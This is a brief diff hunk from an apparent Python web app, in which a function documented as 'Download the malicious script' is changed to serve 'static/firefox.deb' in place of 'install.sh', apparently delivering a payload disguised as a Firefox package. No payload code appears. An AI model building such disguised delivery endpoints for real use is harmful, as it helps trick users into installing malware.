@@ -104,7 +104,7 @@ def myscript():
     Download the malicious script
     """
 
-    path = "static/install.sh"
+    path = "static/firefox.deb"
     return send_file(path)
 
 
